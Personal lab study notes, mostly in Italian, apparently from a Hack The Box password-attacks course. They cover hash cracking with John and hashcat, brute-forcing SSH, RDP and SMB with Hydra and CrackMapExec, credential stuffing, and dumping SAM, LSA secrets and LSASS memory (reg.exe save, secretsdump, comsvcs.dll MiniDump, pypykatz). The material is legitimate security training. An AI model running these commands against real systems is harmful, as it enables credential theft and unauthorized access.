# Johntheripper

## Cracking modes

### Single crack mode

`j4k1dibe@htb[/htb]$ john --format=<hash_type> <hash or hash_file>`


## Wordlist mode
`j4k1dibe@htb[/htb]$ john --wordlist=<wordlist_file> --rules <hash_file>`


## Incremental mode
Questa mode bruteforza usando un character set

di default il character set e' **a-zA-Z0-9**

`j4k1dibe@htb[/htb]$ john --incremental <hash_file>`

## Cracking files

```
cry0l1t3@htb:~$ <tool> <file_to_crack> > file.hash
cry0l1t3@htb:~$ pdf2john server_doc.pdf > server_doc.hash
cry0l1t3@htb:~$ john server_doc.hash
                # OR
cry0l1t3@htb:~$ john --wordlist=<wordlist.txt> server_doc.hash 
```

| Tool                       | Description                                    |
|----------------------------|------------------------------------------------|
| pdf2john                   | Converts PDF documents for John                |
| ssh2john                   | Converts SSH private keys for John             |
| mscash2john                | Converts MS Cash hashes for John               |
| keychain2john              | Converts OS X keychain files for John          |
| rar2john                   | Converts RAR archives for John                 |
| pfx2john                   | Converts PKCS#12 files for John                |
| truecrypt_volume2john      | Converts TrueCrypt volumes for John            |
| keepass2john               | Converts KeePass databases for John            |
| vncpcap2john               | Converts VNC PCAP files for John               |
| putty2john                 | Converts PuTTY private keys for John           |
| zip2john                   | Converts ZIP archives for John                 |
| hccap2john                 | Converts WPA/WPA2 handshake captures for John  |
| office2john                | Converts MS Office documents for John          |
| wpa2john                   | Converts WPA/WPA2 handshakes for John          |

per vederli: `j4k1dibe@htb[/htb]$ locate *2john*`


# Network services

## Crackmapexec
`j4k1dibe@htb[/htb]$ crackmapexec <proto> <target-IP> -u <user or userlist> -p <password or passwordlist>`

`j4k1dibe@htb[/htb]$ crackmapexec winrm 10.129.42.197 -u user.list -p password.list`

## Evil-winRM

`j4k1dibe@htb[/htb]$ evil-winrm -i <target-IP> -u <username> -p <password>`

`j4k1dibe@htb[/htb]$ evil-winrm -i 10.129.42.197 -u user -p password`

## SSH
### Brute-force SSH con Hydra
`j4k1dibe@htb[/htb]$ hydra -L user.list -P password.list ssh://10.129.42.197`

## RDP

### Brute-force RDP with Hydra
`j4k1dibe@htb[/htb]$ hydra -L user.list -P password.list rdp://10.129.42.197`


## SMB
### bruteforce SMB with hydra
`j4k1dibe@htb[/htb]$ hydra -L user.list -P password.list smb://10.129.42.197`

### Bruteforce SMB with metasploit

`msf6 auxiliary(scanner/smb/smb_login) > options `, basta settare usernam/password list e RHOST

### Bruteforce SMB with crackmapexec
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.42.197 -u "user" -p "password" --shares`


# Password Mutations

Molto spesso le persone preferiscono password semplici a password sicure ma devono rispettare le norme imposte per la creazione di password.

Statisticamente la maggior parte di password non sono lunghe piu' di 10 caratteri.

Se abbiamo informazioni su cose tipo il nome loro, il nome dei loro animali domestici, possiamo provare a generare tutte password simili.

Ci sono alcune opzioni di hashcat per modificare le password

| Function | Description                                     |
|----------|-------------------------------------------------|
| :        | Do nothing.                                    |
| l        | Lowercase all letters.                         |
| u        | Uppercase all letters.                         |
| c        | Capitalize the first letter and lowercase others. |
| sXY      | Replace all instances of X with Y.             |
| $!       | Add the exclamation character at the end.      |


## Generating passwords with hashcat
```
j4k1dibe@htb[/htb]$ cat custom.rule

:
c
so0
c so0
sa@
c sa@
c sa@ so0
$!
$! c
$! so0
$! sa@
$! c so0
$! c sa@
$! so0 sa@
$! c so0 sa@



j4k1dibe@htb[/htb]$ hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
j4k1dibe@htb[/htb]$ cat mut_password.list

password
Password
passw0rd
Passw0rd
p@ssword
P@ssword
P@ssw0rd
password!
Password!
passw0rd!
p@ssword!
Passw0rd!
P@ssword!
p@ssw0rd!
P@ssw0rd!
```

### List hashcat existing rules
`j4k1dibe@htb[/htb]$ ls /usr/share/hashcat/rules/`

## Cewl
Cewl e' un tool per fare la scan di potenziali keyword dal sito web di un' azienda e salvare in una lista. poi

`j4k1dibe@htb[/htb]$ cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist`

**-d** flag serve a fare lo spider in profondita'

**-m** e' la minimum length della parola

**--lowercase** 

# Password Reuse / Default Passwords

E' comune che utenti e admin usano la stessa password in piu' app diverse ed e' anche comunque che lascino le credenziali di default dopo l' installazione di un servizio.

## Credential stuffing
Ci sono vari database di default credentials.

**cheat sheet per default credentials: https://github.com/ihebski/DefaultCreds-cheat-sheet**

```
$ pip3 install defaultcreds-cheat-sheet
$ creds search tomcat
```

Attaccare un servizio bruteforzando le default password si dice Credential Stuffing.

### Credential stuffing con Hydra
`j4k1dibe@htb[/htb]$ hydra -C <user_pass.list> <protocol>://<IP>`

COnsidera che user_pass.list deve avere la sintassi **username:password**

# Attacking SAM

## Copying SAM Registry Hives

Registry Hives interessanti che possiamo leggere se siamo local admin

- hklm\sam	Contains the hashes associated with local account passwords. We will need the hashes so we can crack them and get the user account passwords in cleartext.
- hklm\system	Contains the system bootkey, which is used to encrypt the SAM database. We will need the bootkey to decrypt the SAM database.
- hklm\security	Contains cached credentials for domain accounts. We may benefit from having this on a domain-joined Windows target.

### COpiarli con reg.exe
```
C:\WINDOWS\system32> reg.exe save hklm\sam C:\sam.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\system C:\system.save

The operation completed successfully.

C:\WINDOWS\system32> reg.exe save hklm\security C:\security.save

The operation completed successfully.
```

### Dumping hashes with secretsdump.py
`python3 secretsdump.py -sam sam.save -security security.save -system system.save LOCAL`

La prima cosa che fa secretsdump.py e' andare a vedere nella reg key **system**  per cercare la system bootkey con la quale SAM e' criptato. Percio' dobbiamo dargli tutti e 3 i file.

QUesto e' il formato dell' hash: **Dumping local SAM hashes (uid:rid:lmhash:nthash)**

### Usare Hashcat per crackare hash NT
`j4k1dibe@htb[/htb]$ sudo hashcat -m 1000 hashestocrack.txt /usr/share/wordlists/rockyou.txt` -m 1000 e' il formato NTLM based hashes.

## Remote dumping & LSA Secrets Considerations

Con accesso alle credenziali da local admin e' possibile targettare **LSA Secrets** tramite network.

Questo ci permette di estrarre credenziali da un servizio in esecuzione, una scheduled task o applicazioni che usano LSA Secrets per salvare le password

### Dumping LSA Secrets remotely
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa`

### Dumping SAM hashes Remotely
`j4k1dibe@htb[/htb]$ crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam`


# Attacking LSASS

Oltre a prendere copie del SAM Database possiamo targettare LSASS.

Quando si fa l' initial login LSASS fara':
1) Cache credentials locally in memory
2) Create Acess Token
3) Enforce security policies
4) Write to Windows Security log


Dovremo dumpare la memoria del processo LSASS. Si puo' fare con il **Task Manager**. (tasto destro sul processo e Create dump file).
Questo creera' **lsass.DMP** in `C:\Users\loggedonusersdirectory\AppData\Local\Temp`


## Dumping lsass.exe dump with Rundll32.exe & Comsvcs.dll method

Troviamo il PID di Lsass.exe: 

`C:\Windows\system32> tasklist /svc`

troviamo che ha PID 672

`rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full`  C:\lsass.dmp e' l' output file.

## Using pypykatz to extract credentials

Una volta che abbiamo il dump file possiamo usare pypykatz (https://github.com/skelsec/pypykatz) per provare ad estrarre credenziali dal file.

`j4k1dibe@htb[/htb]$ pypykatz lsa minidump /home/peter/Documents/lsass.dmp`

### MSV

Nell' output di pypykatz andiamo a cercare MSV. MSV E' un authentication package in windows che LSA chiama per validare i tentativi di login sul SAM database.

Pypykatz estrae SID, USername e Dominio e pure hash in questa sezione.

### WDIGEST
WDIGEST e' un protocollo di autenticazione piu' vecchio abilitato di default da windXP a win8. e winserver2003-winserer2012.

LSASS salva le credenziali usata da WDIGEST in celar-text. QUindi se troviamo qualcosa qui e' in cleartext.

COmunque nuove versioni di windows ce l'hanno disabilitato di default.

### Kerberos

La parte di output di kerbero potrebbe rivelare ticket di autenticazione. LSASS caches passwords, ekeys, tickets, and pins associated with Kerberos. It is possible to extract these from LSASS process memory and use them to access other systems joined to the same domain.

### DPAPI

Data Protection Application Programming Interface e' un set di API di windwows usate per criptare e decriptare DPAPI data 








